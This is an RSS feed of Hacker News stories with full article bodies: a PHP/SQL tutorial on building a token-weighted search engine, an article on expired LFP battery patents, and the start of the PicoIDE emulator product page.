<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Mon, 17 Nov 2025 13:30:01 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Building a Simple Search Engine That Works (166 pts)]]></title>
            <link>https://karboosx.net/post/4eZxhBon/building-a-simple-search-engine-that-actually-works</link>
            <guid>45950720</guid>
            <pubDate>Mon, 17 Nov 2025 03:52:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://karboosx.net/post/4eZxhBon/building-a-simple-search-engine-that-actually-works">https://karboosx.net/post/4eZxhBon/building-a-simple-search-engine-that-actually-works</a>, See on <a href="https://news.ycombinator.com/item?id=45950720">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <article itemscope="" itemtype="https://schema.org/BlogPosting">
            

            <div itemprop="articleBody">
                <h2>Why Build Your Own?</h2>
<p>Look, I know what you're thinking. "Why not just use Elasticsearch?" or "What about Algolia?" Those are valid options, but they come with complexity. You need to learn their APIs, manage their infrastructure, and deal with their quirks.</p>
<p>Sometimes you just want something that:</p>
<ul>
<li>Works with your existing database</li>
<li>Doesn't require external services</li>
<li>Is easy to understand and debug</li>
<li>Actually finds relevant results</li>
</ul>
<p>That's what I built. A search engine that uses your existing database, respects your current architecture, and gives you full control over how it works.</p>
<hr>
<h2>The Core Idea</h2>
<p>The concept is simple: <strong>tokenize everything, store it, then match tokens when searching</strong>.</p>
<p>Here's how it works:</p>
<ol>
<li><strong>Indexing</strong>: When you add or update content, we split it into tokens (words, prefixes, n-grams) and store them with weights</li>
<li><strong>Searching</strong>: When someone searches, we tokenize their query the same way, find matching tokens, and score the results</li>
<li><strong>Scoring</strong>: We use the stored weights to calculate relevance scores</li>
</ol>
<p>The magic is in the tokenization and weighting. Let me show you what I mean.</p>
<hr>
<h2>Building Block 1: The Database Schema</h2>
<p>We need two simple tables: <code>index_tokens</code> and <code>index_entries</code>.</p>
<h3>index_tokens</h3>
<p>This table stores all unique tokens with their tokenizer weights. Each token name can have multiple records with different weights—one per tokenizer.</p>
<pre><code>// index_tokens table structure
id | name    | weight
---|---------|-------
1  | parser  | 20     // From WordTokenizer
2  | parser  | 5      // From PrefixTokenizer
3  | parser  | 1      // From NGramsTokenizer
4  | parser  | 10     // From SingularTokenizer
</code></pre>
<p>Why store separate tokens per weight? Different tokenizers produce the same token with different weights. For example, "parser" from WordTokenizer has weight 20, but "parser" from PrefixTokenizer has weight 5. We need separate records to properly score matches.</p>
<p>The unique constraint is on <code>(name, weight)</code>, so the same token name can exist multiple times with different weights.</p>
<h3>index_entries</h3>
<p>This table links tokens to documents with field-specific weights.</p>
<pre><code>// index_entries table structure
id | token_id | document_type | field_id | document_id | weight
---|----------|---------------|----------|-------------|-------
1  | 1        | 1             | 1        | 42          | 2000
2  | 2        | 1             | 1        | 42          | 500
</code></pre>
<p>The <code>weight</code> here is the final calculated weight: <code>field_weight × tokenizer_weight × ceil(sqrt(token_length))</code>. This encodes everything we need for scoring. We will talk about scoring later in the post.</p>
<p>We add indexes on:</p>
<ul>
<li><code>(document_type, document_id)</code> - for fast document lookups</li>
<li><code>token_id</code> - for fast token lookups</li>
<li><code>(document_type, field_id)</code> - for field-specific queries</li>
<li><code>weight</code> - for filtering by weight</li>
</ul>
<p>Why this structure? Simple, efficient, and leverages what databases do best.</p>
<hr>
<h2>Building Block 2: Tokenization</h2>
<p>What is tokenization? It's breaking text into searchable pieces. The word "parser" becomes tokens like <code>["parser"]</code>, <code>["par", "pars", "parse", "parser"]</code>, or <code>["par", "ars", "rse", "ser"]</code> depending on which tokenizer we use.</p>
<p>Why multiple tokenizers? Different strategies for different matching needs. One tokenizer for exact matches, another for partial matches, another for typos.</p>
<p>All tokenizers implement a simple interface:</p>
<pre><code>interface TokenizerInterface
{
    public function tokenize(string $text): array;  // Returns array of Token objects
    public function getWeight(): int;               // Returns tokenizer weight
}
</code></pre>
<p>Simple contract, easy to extend.</p>
<h3>Word Tokenizer</h3>
<p>This one is straightforward—it splits text into individual words. "parser" becomes just <code>["parser"]</code>. Simple, but powerful for exact matches.</p>
<p>First, we normalize the text. Lowercase everything, remove special characters, normalize whitespace:</p>
<pre><code>class WordTokenizer implements TokenizerInterface
{
    public function tokenize(string $text): array
    {
        // Normalize: lowercase, remove special chars
        $text = mb_strtolower(trim($text));
        $text = preg_replace('/[^a-z0-9]/', ' ', $text);
        $text = preg_replace('/\s+/', ' ', $text);
</code></pre>
<p>Next, we split into words and filter out short ones:</p>
<pre><code>        // Split into words, filter short ones
        $words = explode(' ', $text);
        $words = array_filter($words, fn($w) =&gt; mb_strlen($w) &gt;= 2);
</code></pre>
<p>Why filter short words? Single-character words are usually too common to be useful. "a", "I", "x" don't help with search.</p>
<p>Finally, we return unique words as Token objects:</p>
<pre><code>        // Return as Token objects with weight
        return array_map(
            fn($word) =&gt; new Token($word, $this-&gt;weight),
            array_unique($words)
        );
    }
}
</code></pre>
<p>Weight: 20 (high priority for exact matches)</p>
<h3>Prefix Tokenizer</h3>
<p>This generates word prefixes. "parser" becomes <code>["par", "pars", "parse", "parser"]</code> (with min length 4). This helps with partial matches and autocomplete-like behavior.</p>
<p>First, we extract words (same normalization as WordTokenizer):</p>
<pre><code>class PrefixTokenizer implements TokenizerInterface
{
    public function __construct(
        private int $minPrefixLength = 4,
        private int $weight = 5
    ) {}
    
    public function tokenize(string $text): array
    {
        // Normalize same as WordTokenizer
        $words = $this-&gt;extractWords($text);
</code></pre>
<p>Then, for each word, we generate prefixes from the minimum length to the full word:</p>
<pre><code>        $tokens = [];
        foreach ($words as $word) {
            $wordLength = mb_strlen($word);
            // Generate prefixes from min length to full word
            for ($i = $this-&gt;minPrefixLength; $i &lt;= $wordLength; $i++) {
                $prefix = mb_substr($word, 0, $i);
                $tokens[$prefix] = true; // Use associative array for uniqueness
            }
        }
</code></pre>
<p>Why use an associative array? It ensures uniqueness. If "parser" appears twice in the text, we only want one "parser" token.</p>
<p>Finally, we convert the keys to Token objects:</p>
<pre><code>        return array_map(
            fn($prefix) =&gt; new Token($prefix, $this-&gt;weight),
            array_keys($tokens)
        );
    }
}
</code></pre>
<p>Weight: 5 (medium priority)</p>
<p>Why min length? Avoid too many tiny tokens. Prefixes shorter than 4 characters are usually too common to be useful.</p>
<h3>N-Grams Tokenizer</h3>
<p>This creates character sequences of a fixed length (I use 3). "parser" becomes <code>["par", "ars", "rse", "ser"]</code>. This catches typos and partial word matches.</p>
<p>First, we extract words:</p>
<pre><code>class NGramsTokenizer implements TokenizerInterface
{
    public function __construct(
        private int $ngramLength = 3,
        private int $weight = 1
    ) {}
    
    public function tokenize(string $text): array
    {
        $words = $this-&gt;extractWords($text);
</code></pre>
<p>Then, for each word, we slide a window of fixed length across it:</p>
<pre><code>        $tokens = [];
        foreach ($words as $word) {
            $wordLength = mb_strlen($word);
            // Sliding window of fixed length
            for ($i = 0; $i &lt;= $wordLength - $this-&gt;ngramLength; $i++) {
                $ngram = mb_substr($word, $i, $this-&gt;ngramLength);
                $tokens[$ngram] = true;
            }
        }
</code></pre>
<p>The sliding window: for "parser" with length 3, we get:</p>
<ul>
<li>Position 0: "par"</li>
<li>Position 1: "ars"</li>
<li>Position 2: "rse"</li>
<li>Position 3: "ser"</li>
</ul>
<p>Why this works? Even if someone types "parsr" (typo), we still get "par" and "ars" tokens, which match the correctly spelled "parser".</p>
<p>Finally, we convert to Token objects:</p>
<pre><code>        return array_map(
            fn($ngram) =&gt; new Token($ngram, $this-&gt;weight),
            array_keys($tokens)
        );
    }
}
</code></pre>
<p>Weight: 1 (low priority, but catches edge cases)</p>
<p>Why 3? Balance between coverage and noise. Too short and you get too many matches, too long and you miss typos.</p>
<h3>Normalization</h3>
<p>All tokenizers do the same normalization:</p>
<ul>
<li>Lowercase everything</li>
<li>Remove special characters (keep only alphanumerical)</li>
<li>Normalize whitespace (multiple spaces to single space)</li>
</ul>
<p>This ensures consistent matching regardless of input format.</p>
<hr>
<h2>Building Block 3: The Weight System</h2>
<p>We have three levels of weights working together:</p>
<ol>
<li><strong>Field weights</strong>: Title vs content vs keywords</li>
<li><strong>Tokenizer weights</strong>: Word vs prefix vs n-gram (stored in index_tokens)</li>
<li><strong>Document weights</strong>: Stored in index_entries (calculated: <code>field_weight × tokenizer_weight × ceil(sqrt(token_length))</code>)</li>
</ol>
<h3>Final Weight Calculation</h3>
<p>When indexing, we calculate the final weight like this:</p>
<pre><code>$finalWeight = $fieldWeight * $tokenizerWeight * ceil(sqrt($tokenLength));
</code></pre>
<p>For example:</p>
<ul>
<li>Title field: weight 10</li>
<li>Word tokenizer: weight 20</li>
<li>Token "parser": length 6</li>
<li>Final weight: <code>10 × 20 × ceil(sqrt(6)) = 10 × 20 × 3 = 600</code></li>
</ul>
<p>Why use <code>ceil(sqrt())</code>? Longer tokens are more specific, but we don't want weights to blow up with very long tokens. "parser" is more specific than "par", but a 100-character token shouldn't have 100x the weight. The square root function gives us diminishing returns—longer tokens still score higher, but not linearly. We use <code>ceil()</code> to round up to the nearest integer, keeping weights as whole numbers.</p>
<h3>Tuning Weights</h3>
<p>You can adjust weights for your use case:</p>
<ul>
<li>Increase field weights for titles if titles are most important</li>
<li>Increase tokenizer weights for exact matches if you want to prioritize exact matches</li>
<li>Adjust the token length function (ceil(sqrt), log, or linear) if you want longer tokens to matter more or less</li>
</ul>
<p>You can see exactly how weights are calculated and adjust them as needed.</p>
<hr>
<h2>Building Block 4: The Indexing Service</h2>
<p>The indexing service takes a document and stores all its tokens in the database.</p>
<h3>The Interface</h3>
<p>Documents that can be indexed implement <code>IndexableDocumentInterface</code>:</p>
<pre><code>interface IndexableDocumentInterface
{
    public function getDocumentId(): int;
    public function getDocumentType(): DocumentType;
    public function getIndexableFields(): IndexableFields;
}
</code></pre>
<p>To make a document searchable, you implement these three methods:</p>
<pre><code>class Post implements IndexableDocumentInterface
{
    public function getDocumentId(): int
    {
        return $this-&gt;id ?? 0;
    }
    
    public function getDocumentType(): DocumentType
    {
        return DocumentType::POST;
    }
    
    public function getIndexableFields(): IndexableFields
    {
        $fields = IndexableFields::create()
            -&gt;addField(FieldId::TITLE, $this-&gt;title ?? '', 10)
            -&gt;addField(FieldId::CONTENT, $this-&gt;content ?? '', 1);
        
        // Add keywords if present
        if (!empty($this-&gt;keywords)) {
            $fields-&gt;addField(FieldId::KEYWORDS, $this-&gt;keywords, 20);
        }
        
        return $fields;
    }
}
</code></pre>
<p>Three methods to implement:</p>
<ul>
<li><code>getDocumentType()</code>: returns the document type enum</li>
<li><code>getDocumentId()</code>: returns the document ID</li>
<li><code>getIndexableFields()</code>: builds fields with weights using fluent API</li>
</ul>
<p>You can index documents:</p>
<ul>
<li>On create/update (via event listeners)</li>
<li>Via commands: <code>app:index-document</code>, <code>app:reindex-documents</code></li>
<li>Via cron (for batch reindexing)</li>
</ul>
<h3>How It Works</h3>
<p>Here's the indexing process, step by step.</p>
<p>First, we get the document information:</p>
<pre><code>class SearchIndexingService
{
    public function indexDocument(IndexableDocumentInterface $document): void
    {
        // 1. Get document info
        $documentType = $document-&gt;getDocumentType();
        $documentId = $document-&gt;getDocumentId();
        $indexableFields = $document-&gt;getIndexableFields();
        $fields = $indexableFields-&gt;getFields();
        $weights = $indexableFields-&gt;getWeights();
</code></pre>
<p>The document provides its fields and weights via the <code>IndexableFields</code> builder.</p>
<p>Next, we remove the existing index for this document. This handles updates—if the document changed, we need to reindex it:</p>
<pre><code>        // 2. Remove existing index for this document
        $this-&gt;removeDocumentIndex($documentType, $documentId);
        
        // 3. Prepare batch insert data
        $insertData = [];
</code></pre>
<p>Why remove first? If we just add new tokens, we'll have duplicates. Better to start fresh.</p>
<p>Now, we process each field. For each field, we run all tokenizers:</p>
<pre><code>        // 4. Process each field
        foreach ($fields as $fieldIdValue =&gt; $content) {
            if (empty($content)) {
                continue;
            }
            
            $fieldId = FieldId::from($fieldIdValue);
            $fieldWeight = $weights[$fieldIdValue] ?? 0;
            
            // 5. Run all tokenizers on this field
            foreach ($this-&gt;tokenizers as $tokenizer) {
                $tokens = $tokenizer-&gt;tokenize($content);
</code></pre>
<p>For each tokenizer, we get tokens. Then, for each token, we find or create it in the database and calculate the final weight:</p>
<pre><code>                foreach ($tokens as $token) {
                    $tokenValue = $token-&gt;value;
                    $tokenWeight = $token-&gt;weight;
                    
                    // 6. Find or create token in index_tokens
                    $tokenId = $this-&gt;findOrCreateToken($tokenValue, $tokenWeight);
                    
                    // 7. Calculate final weight
                    $tokenLength = mb_strlen($tokenValue);
                    $finalWeight = (int) ($fieldWeight * $tokenWeight * ceil(sqrt($tokenLength)));
                    
                    // 8. Add to batch insert
                    $insertData[] = [
                        'token_id' =&gt; $tokenId,
                        'document_type' =&gt; $documentType-&gt;value,
                        'field_id' =&gt; $fieldId-&gt;value,
                        'document_id' =&gt; $documentId,
                        'weight' =&gt; $finalWeight,
                    ];
                }
            }
        }
</code></pre>
<p>Why batch insert? Performance. Instead of inserting one row at a time, we collect all rows and insert them in one query.</p>
<p>Finally, we batch insert everything:</p>
<pre><code>        // 9. Batch insert for performance
        if (!empty($insertData)) {
            $this-&gt;batchInsertSearchDocuments($insertData);
        }
    }
</code></pre>
<p>The <code>findOrCreateToken</code> method is straightforward:</p>
<pre><code>    private function findOrCreateToken(string $name, int $weight): int
    {
        // Try to find existing token with same name and weight
        $sql = "SELECT id FROM index_tokens WHERE name = ? AND weight = ?";
        $result = $this-&gt;connection-&gt;executeQuery($sql, [$name, $weight])-&gt;fetchAssociative();
        
        if ($result) {
            return (int) $result['id'];
        }
        
        // Create new token
        $insertSql = "INSERT INTO index_tokens (name, weight) VALUES (?, ?)";
        $this-&gt;connection-&gt;executeStatement($insertSql, [$name, $weight]);
        
        return (int) $this-&gt;connection-&gt;lastInsertId();
    }
}
</code></pre>
<p>Why find or create? Tokens are shared across documents. If "parser" already exists with weight 20, we reuse it. No need to create duplicates.</p>
<p>The key points:</p>
<ul>
<li>We remove old index first (handles updates)</li>
<li>We batch insert for performance (one query instead of many)</li>
<li>We find or create tokens (avoids duplicates)</li>
<li>We calculate final weight on the fly</li>
</ul>
<hr>
<h2>Building Block 5: The Search Service</h2>
<p>The search service takes a query string and finds relevant documents. It tokenizes the query the same way we tokenized documents during indexing, then matches those tokens against the indexed tokens in the database. The results are scored by relevance and returned as document IDs with scores.</p>
<h3>How It Works</h3>
<p>Here's the search process, step by step.</p>
<p>First, we tokenize the query using all tokenizers:</p>
<pre><code>class SearchService
{
    public function search(DocumentType $documentType, string $query, ?int $limit = null): array
    {
        // 1. Tokenize query using all tokenizers
        $queryTokens = $this-&gt;tokenizeQuery($query);
        
        if (empty($queryTokens)) {
            return [];
        }
</code></pre>
<p>If the query produces no tokens (e.g., only special characters), we return empty results.</p>
<h3>Why Tokenize the Query Using the Same Tokenizers?</h3>
<p>Different tokenizers produce different token values. If we index with one set and search with another, we'll miss matches.</p>
<p>Example:</p>
<ul>
<li>Indexing with PrefixTokenizer creates tokens: "par", "pars", "parse", "parser"</li>
<li>Searching with only WordTokenizer creates token: "parser"</li>
<li>We'll find "parser", but we won't find documents that only have "par" or "pars" tokens</li>
<li>Result: Incomplete matches, missing relevant documents!</li>
</ul>
<p><strong>The solution</strong>: Use the same tokenizers for both indexing and searching. Same tokenization strategy = same token values = complete matches.</p>
<p>This is why the <code>SearchService</code> and <code>SearchIndexingService</code> both receive the same set of tokenizers.</p>
<p>Next, we extract unique token values. Multiple tokenizers might produce the same token value, so we deduplicate:</p>
<pre><code>        // 2. Extract unique token values
        $tokenValues = array_unique(array_map(
            fn($token) =&gt; $token instanceof Token ? $token-&gt;value : $token,
            $queryTokens
        ));
</code></pre>
<p>Why extract values? We search by token name, not by weight. We need the unique token names to search for.</p>
<p>Then, we sort tokens by length (longest first). This prioritizes specific matches:</p>
<pre><code>        // 3. Sort tokens (longest first - prioritize specific matches)
        usort($tokenValues, fn($a, $b) =&gt; mb_strlen($b) &lt;=&gt; mb_strlen($a));
</code></pre>
<p>Why sort? Longer tokens are more specific. "parser" is more specific than "par", so we want to search for "parser" first.</p>
<p>We also limit the token count to prevent DoS attacks with huge queries:</p>
<pre><code>        // 4. Limit token count (prevent DoS with huge queries)
        if (count($tokenValues) &gt; 300) {
            $tokenValues = array_slice($tokenValues, 0, 300);
        }
</code></pre>
<p>Why limit? A malicious user could send a query that produces thousands of tokens, causing performance issues. We keep the longest 300 tokens (already sorted).</p>
<p>Now, we execute the optimized SQL query. The <code>executeSearch()</code> method builds the SQL query and executes it:</p>
<pre><code>        // 5. Execute optimized SQL query
        $results = $this-&gt;executeSearch($documentType, $tokenValues, $limit);
</code></pre>
<p>Inside <code>executeSearch()</code>, we build the SQL query with parameter placeholders, execute it, filter low-scoring results, and convert to SearchResult objects:</p>
<pre><code>private function executeSearch(DocumentType $documentType, array $tokenValues, int $tokenCount, ?int $limit, int $minTokenWeight): array
{
    // Build parameter placeholders for token values
    $tokenPlaceholders = implode(',', array_fill(0, $tokenCount, '?'));
    
    // Build the SQL query (shown in full in "The SQL Query" section below)
    $sql = "SELECT sd.document_id, ... FROM index_entries sd ...";
    
    // Build parameters array
    $params = [
        $documentType-&gt;value,  // document_type
        ...$tokenValues,       // token values for IN clause
        $documentType-&gt;value,  // for subquery
        ...$tokenValues,       // token values for subquery
        $minTokenWeight,      // minimum token weight
        // ... more parameters
    ];
    
    // Execute query with parameter binding
    $results = $this-&gt;connection-&gt;executeQuery($sql, $params)-&gt;fetchAllAssociative();
    
    // Filter out results with low normalized scores (below threshold)
    $results = array_filter($results, fn($r) =&gt; (float) $r['score'] &gt;= 0.05);
    
    // Convert to SearchResult objects
    return array_map(
        fn($result) =&gt; new SearchResult(
            documentId: (int) $result['document_id'],
            score: (float) $result['score']
        ),
        $results
    );
}
</code></pre>
<p>The SQL query does the heavy lifting: finds matching documents, calculates scores, and sorts by relevance. We use raw SQL for performance and full control—we can optimize the query exactly how we need it.</p>
<p>The query uses JOINs to connect tokens and documents, subqueries for normalization, aggregation for scoring, and indexes on token name, document type, and weight. We use parameter binding for security (prevents SQL injection).</p>
<p>We'll see the full query in the next section.</p>
<p>The main <code>search()</code> method then returns the results:</p>
<pre><code>        // 5. Return results
        return $results;
    }
}
</code></pre>
<h3>The Scoring Algorithm</h3>
<p>The scoring algorithm balances multiple factors. Let's break it down step by step.</p>
<p>The base score is the sum of all matched token weights:</p>
<pre><code>SELECT 
    sd.document_id,
    SUM(sd.weight) as base_score
FROM index_entries sd
INNER JOIN index_tokens st ON sd.token_id = st.id
WHERE 
    sd.document_type = ?
    AND st.name IN (?, ?, ?)  -- Query tokens
GROUP BY sd.document_id
</code></pre>
<ul>
<li><code>sd.weight</code>: from index_entries (field_weight × tokenizer_weight × ceil(sqrt(token_length)))</li>
</ul>
<p>Why not multiply by <code>st.weight</code>? The tokenizer weight is already included in <code>sd.weight</code> during indexing. The <code>st.weight</code> from <code>index_tokens</code> is used only in the full SQL query's WHERE clause for filtering (ensures at least one token with weight &gt;= minTokenWeight).</p>
<p>This gives us the raw score. But we need more than that.</p>
<p>We add a token diversity boost. Documents matching more unique tokens score higher:</p>
<pre><code>(1.0 + LOG(1.0 + COUNT(DISTINCT sd.token_id))) * base_score
</code></pre>
<p>Why? A document matching 5 different tokens is more relevant than one matching the same token 5 times. The LOG function makes this boost logarithmic—matching 10 tokens doesn't give 10x the boost.</p>
<p>We also add an average weight quality boost. Documents with higher quality matches score higher:</p>
<pre><code>(1.0 + LOG(1.0 + AVG(sd.weight))) * base_score
</code></pre>
<p>Why? A document with high-weight matches (e.g., title matches) is more relevant than one with low-weight matches (e.g., content matches). Again, LOG makes this logarithmic.</p>
<p>We apply a document length penalty. Prevents long documents from dominating:</p>
<pre><code>base_score / (1.0 + LOG(1.0 + doc_token_count.token_count))
</code></pre>
<p>Why? A 1000-word document doesn't automatically beat a 100-word document just because it has more tokens. The LOG function makes this penalty logarithmic—a 10x longer document doesn't get 10x the penalty.</p>
<p>Finally, we normalize by dividing by the maximum score:</p>
<pre><code>score / GREATEST(1.0, max_score) as normalized_score
</code></pre>
<p>This gives us a 0-1 range, making scores comparable across different queries.</p>
<p>The full formula looks like this:</p>
<pre><code>SELECT 
    sd.document_id,
    (
        SUM(sd.weight) *                                  -- Base score
        (1.0 + LOG(1.0 + COUNT(DISTINCT sd.token_id))) * -- Token diversity boost
        (1.0 + LOG(1.0 + AVG(sd.weight))) /              -- Average weight quality boost
        (1.0 + LOG(1.0 + doc_token_count.token_count))   -- Document length penalty
    ) / GREATEST(1.0, max_score) as score                -- Normalization
FROM index_entries sd
INNER JOIN index_tokens st ON sd.token_id = st.id
INNER JOIN (
    SELECT document_id, COUNT(*) as token_count
    FROM index_entries
    WHERE document_type = ?
    GROUP BY document_id
) doc_token_count ON sd.document_id = doc_token_count.document_id
WHERE 
    sd.document_type = ?
    AND st.name IN (?, ?, ?)  -- Query tokens
    AND sd.document_id IN (
        SELECT DISTINCT document_id
        FROM index_entries sd2
        INNER JOIN index_tokens st2 ON sd2.token_id = st2.id
        WHERE sd2.document_type = ?
        AND st2.name IN (?, ?, ?)
        AND st2.weight &gt;= ?  -- Ensure at least one token with meaningful weight
    )
GROUP BY sd.document_id
ORDER BY score DESC
LIMIT ?
</code></pre>
<p>Why the subquery with <code>st2.weight &gt;= ?</code>? This ensures we only include documents that have at least one matching token with a meaningful tokenizer weight. Without this filter, a document matching only low-priority tokens (like n-grams with weight 1) would be included even if it doesn't match any high-priority tokens (like words with weight 20). This subquery filters out documents that only match noise. We want documents that match at least one meaningful token.</p>
<p>Why this formula? It balances multiple factors for relevance. Exact matches score high, but so do documents matching many tokens. Long documents don't dominate, but high-quality matches do.</p>
<p>If no results with weight 10, we retry with weight 1 (fallback for edge cases).</p>
<h3>Converting IDs to Documents</h3>
<p>The search service returns <code>SearchResult</code> objects with document IDs and scores:</p>
<pre><code>class SearchResult
{
    public function __construct(
        public readonly int $documentId,
        public readonly float $score
    ) {}
}
</code></pre>
<p>But we need actual documents, not just IDs. We convert them using repositories:</p>
<pre><code>// Perform search
$searchResults = $this-&gt;searchService-&gt;search(
    DocumentType::POST,
    $query,
    $limit
);

// Get document IDs from search results (preserving order)
$documentIds = array_map(fn($result) =&gt; $result-&gt;documentId, $searchResults);

// Get documents by IDs (preserving order from search results)
$documents = $this-&gt;documentRepository-&gt;findByIds($documentIds);
</code></pre>
<p>Why preserve order? The search results are sorted by relevance score. We want to keep that order when displaying results.</p>
<p>The repository method handles the conversion:</p>
<pre><code>public function findByIds(array $ids): array
{
    if (empty($ids)) {
        return [];
    }
    
    return $this-&gt;createQueryBuilder('d')
        -&gt;where('d.id IN (:ids)')
        -&gt;setParameter('ids', $ids)
        -&gt;orderBy('FIELD(d.id, :ids)')  // Preserve order from IDs array
        -&gt;getQuery()
        -&gt;getResult();
}
</code></pre>
<p>The <code>FIELD()</code> function preserves the order from the IDs array, so documents appear in the same order as search results.</p>
<hr>
<h2>The Result: What You Get</h2>
<p>What you get is a search engine that:</p>
<ul>
<li><strong>Finds relevant results quickly</strong> (leverages database indexes)</li>
<li><strong>Handles typos</strong> (n-grams catch partial matches)</li>
<li><strong>Handles partial words</strong> (prefix tokenizer)</li>
<li><strong>Prioritizes exact matches</strong> (word tokenizer has highest weight)</li>
<li><strong>Works with existing database</strong> (no external services)</li>
<li><strong>Easy to understand and debug</strong> (everything is transparent)</li>
<li><strong>Full control over behavior</strong> (adjust weights, add tokenizers, modify scoring)</li>
</ul>
<hr>
<h2>Extending the System</h2>
<p>Want to add a new tokenizer? Implement <code>TokenizerInterface</code>:</p>
<pre><code>class StemmingTokenizer implements TokenizerInterface
{
    public function tokenize(string $text): array
    {
        // Your stemming logic here
        // Return array of Token objects
    }
    
    public function getWeight(): int
    {
        return 15; // Your weight
    }
}
</code></pre>
<p>Register it in your services configuration, and it's automatically used for both indexing and searching.</p>
<p>Want to add a new document type? Implement <code>IndexableDocumentInterface</code>:</p>
<pre><code>class Comment implements IndexableDocumentInterface
{
    public function getIndexableFields(): IndexableFields
    {
        return IndexableFields::create()
            -&gt;addField(FieldId::CONTENT, $this-&gt;content ?? '', 5);
    }
}
</code></pre>
<p>Want to adjust weights? Change the configuration. Want to modify scoring? Edit the SQL query. Everything is under your control.</p>
<hr>
<h2>Conclusion</h2>
<p>So there you have it. A simple search engine that actually works. It's not fancy, and it doesn't need a lot of infrastructure, but for most use cases, it's perfect.</p>
<p>The key insight? Sometimes the best solution is the one you understand. No magic, no black boxes, just straightforward code that does what it says.</p>
<p>You own it, you control it, you can debug it. And that's worth a lot.</p>

            </div>

            
        </article>

        
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A new chapter begins for EV batteries with the expiry of key LFP patents (161 pts)]]></title>
            <link>https://www.shoosmiths.com/insights/articles/a-new-chapter-begins-for-ev-batteries-with-the-expiry-of-key-lfp-patents</link>
            <guid>45949655</guid>
            <pubDate>Sun, 16 Nov 2025 23:58:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.shoosmiths.com/insights/articles/a-new-chapter-begins-for-ev-batteries-with-the-expiry-of-key-lfp-patents">https://www.shoosmiths.com/insights/articles/a-new-chapter-begins-for-ev-batteries-with-the-expiry-of-key-lfp-patents</a>, See on <a href="https://news.ycombinator.com/item?id=45949655">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-component="">
            <h3>The expiry of key patents for LFP battery chemistry in 2022 transformed the EV industry. With technology now freely accessible, global battery strategies are shifting as former IP barriers fall.</h3>
    <p>An LFP battery is a type of lithium-ion battery that uses lithium iron phosphate (LiFePO4) as the cathode material. LFP’s appeal in the EV sector is clear: lower cost compared to batteries based on nickel and cobalt chemistries, low toxicity and good safety due to their superior thermal stability. Tesla’s use of LFP in some of its standard-range models signalled the beginning of a broader trend, now accelerating across Western markets. LFP batteries are also proving a popular choice for renewable energy storage.</p>
<p>However, barriers to commercialisation of LFP technology remain. With the core chemistry now in the public domain, the focus of intellectual property protection has shifted. Companies are securing patents around secondary innovation, with a focus on enhancing energy density, improving safety, fast-charging capabilities and reducing costs. For example, CATL (Contemporary Amperex Technology Co. Limited) has developed and commercialised cell-to-pack technology with its Quilin battery. BYD and Tesla, amongst others, also own patents relating to LFP technology. Such proprietary engineering technology will still deliver competitive advantage. Trade secrets and manufacturing know-how are also becoming increasingly valuable.</p>
<p>Freedom-to-operate (FTO) analysis therefore remains critical for market entrants. Whilst the primary patents have expired, a dense web of secondary patents, covering additives, coatings, and production methods, still poses infringement risks. Firms entering the LFP space need to engage in increasingly nuanced FTO due diligence to navigate this residual IP thicket and minimise their risk of being on the receiving end of an infringement lawsuit.</p>
<p>Aside from the patent landscape, there are other structural and strategic barriers for exploitation of LFP technology:</p>
<ul>
    <li>recycling economics: as LFP batteries lack high-value metals like cobalt and nickel, they are less attractive to recyclers. This poses a challenge in light of EU regulations requiring lithium-ion batteries to contain at least 6% recycled lithium by 2031, rising to 12% by 2036. Whilst companies are developing new capabilities, for example UK-based Altilium’s proprietary EcoCathode technology, which promises to recover 97% lithium and 99% graphite from used LFP cells, these technologies are in their infancy.</li>
    <li>supply chain dependencies: Western manufacturers remain heavily reliant on Chinese suppliers for high tap-density iron phosphate precursors (which allows for increased energy density in the battery) and cell manufacturing expertise.</li>
    <li>infrastructure misalignment: the UK’s charging infrastructure still needs to be significantly developed to encourage uptake of EVs.</li>
</ul>
<p>In short, the LFP patent cliff is not the end of the story. Rather it is the beginning of a new chapter in EV innovation, where competitive advantage can still be obtained through further technological developments. For IP professionals and EV strategists, the task is to develop protection strategies that reflect this new paradigm. Effective trade secret and patent protection will be essential components of this, as well as the formation of strategic partnerships.&nbsp;</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[PicoIDE – An open IDE/ATAPI drive emulator (143 pts)]]></title>
            <link>https://picoide.com/</link>
            <guid>45949352</guid>
            <pubDate>Sun, 16 Nov 2025 23:19:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://picoide.com/">https://picoide.com/</a>, See on <a href="https://news.ycombinator.com/item?id=45949352">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <header>
            <h2><img src="https://picoide.com/picoide-logo-black-red.svg" alt="PicoIDE"></h2>
            
        </header>

        <main>
            <article>
                <h3>
                    PicoIDE is a device that emulates IDE/ATAPI devices developed by Ian Scott, creator of <a href="https://picog.us/">PicoGUS</a>.
                </h3>

                <section>
                    <ul>
                        <li>Fully open source firmware and hardware</li>
                        <li>Emulates ATAPI CD-ROM and IDE fixed hard drives
                            <ul>
                                <li>.bin/.cue or .iso image support for CD-ROM</li>
                                <li>.img/.hda/.vhd/.hdf for HDD</li>
                            </ul>
                        </li>
                        <li>Built-in CD audio output on 3.5" jack and MPC-2 header</li>
                        <li>Supports PIO modes 0-4 and multi-word DMA modes 0-2</li>
                        <li>Optional front panel/3.5" drive bay enclosure with:
                            <ul>
                                <li>1.3" 128x64 OLED screen &amp; 4-way navigation buttons</li>
                                <li>WiFi for remote control and upload/management of disk images</li>
                                <li>RGB activity LED</li>
                            </ul>
                        </li>
                    </ul>

                    <figure>
                        <a href="https://picoide.com/picoide_evt2_angle.jpg">
                            <img src="https://picoide.com/picoide-on-stack.jpg" alt="PicoIDE seen from an angle">
                        </a>
                    </figure>
                </section>
            </article>

            <section>
                <a href="https://picoide.com/picoide-ready-sm.jpg">
